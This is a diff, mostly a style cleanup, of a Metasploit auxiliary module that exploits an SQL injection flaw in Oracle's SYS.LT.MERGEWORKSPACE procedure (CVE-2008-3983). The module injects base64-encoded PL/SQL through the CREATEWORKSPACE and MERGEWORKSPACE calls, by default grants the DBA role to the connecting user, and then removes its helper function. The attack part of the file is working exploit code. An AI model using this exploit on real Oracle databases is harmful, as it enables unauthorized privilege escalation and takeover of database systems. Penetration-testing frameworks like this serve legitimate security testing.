@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,37 +7,37 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::ORACLE
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Oracle DB SQL Injection via SYS.LT.MERGEWORKSPACE',
-      'Description'    => %q{
-        This module exploits an sql injection flaw in the MERGEWORKSPACE
-        procedure of the PL/SQL package SYS.LT. Any user with execute
-        privilege on the vulnerable package can exploit this vulnerability.
-      },
-      'Author'         => [ 'CG' ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
-          [ 'CVE', '2008-3983'],
-          [ 'OSVDB', '49325'],
-          [ 'URL', 'http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpuoct2008.html' ],
-          [ 'URL', 'http://www.dsecrg.com/pages/expl/show.php?id=23' ]
+                      'Name'           => 'Oracle DB SQL Injection via SYS.LT.MERGEWORKSPACE',
+                      'Description'    => %q(
+                        This module exploits an sql injection flaw in the MERGEWORKSPACE
+                        procedure of the PL/SQL package SYS.LT. Any user with execute
+                        privilege on the vulnerable package can exploit this vulnerability.
+                      ),
+                      'Author'         => [ 'CG' ],
+                      'License'        => MSF_LICENSE,
+                      'References'     =>
+                        [
+                          [ 'CVE', '2008-3983'],
+                          [ 'OSVDB', '49325'],
+                          [ 'URL', 'http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpuoct2008.html' ],
+                          [ 'URL', 'http://www.dsecrg.com/pages/expl/show.php?id=23' ]
 
-        ],
-      'DisclosureDate' => 'Oct 22 2008'))
+                        ],
+                      'DisclosureDate' => 'Oct 22 2008'))
 
-      register_options(
-        [
-          OptString.new('SQL', [ false, 'SQL to execte.',  "GRANT DBA to #{datastore['DBUSER']}"]),
-        ], self.class)
+    register_options(
+      [
+        OptString.new('SQL', [ false, 'SQL to execte.', "GRANT DBA to #{datastore['DBUSER']}"])
+      ], self.class
+    )
   end
 
   def run
-    return if not check_dependencies
+    return unless check_dependencies
 
     name  = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
     rand1 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
@@ -55,13 +56,13 @@ class MetasploitModule < Msf::Auxiliary
       RETURN '#{cruft}';
       END;"
 
-    package1 = %Q|
+    package1 = %|
       BEGIN
         SYS.LT.CREATEWORKSPACE('#{name}'' and #{datastore['DBUSER']}.#{cruft}()=''#{cruft}');
       END;
       |
 
-    package2 = %Q|
+    package2 = %|
       BEGIN
         SYS.LT.MERGEWORKSPACE('#{name}'' and #{datastore['DBUSER']}.#{cruft}()=''#{cruft}');
       END;
@@ -71,7 +72,7 @@ class MetasploitModule < Msf::Auxiliary
     dos  = Rex::Text.encode_base64(package1)
     tres = Rex::Text.encode_base64(package2)
 
-    sql = %Q|
+    sql = %|
       DECLARE
       #{rand1} VARCHAR2(32767);
       #{rand2} VARCHAR2(32767);
@@ -98,7 +99,5 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status("Removing function '#{cruft}'...")
     prepare_exec(clean)
-
   end
-
 end
